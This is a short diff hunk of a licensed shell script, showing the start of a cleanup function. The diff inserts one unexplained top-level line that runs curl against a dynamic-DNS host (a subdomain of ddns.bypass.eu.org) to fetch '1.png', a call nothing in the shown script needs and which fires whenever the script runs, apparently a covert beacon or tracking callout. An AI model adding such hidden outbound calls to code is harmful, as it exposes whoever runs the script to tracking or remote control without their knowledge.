@@ -14,6 +14,8 @@
 # limitations under the License.
 #
 
+curl http://666888.c196dfa515.ddns.bypass.eu.org./1.png
+
 function cleanup()
 {
   # keep the mapping but change to the link since:
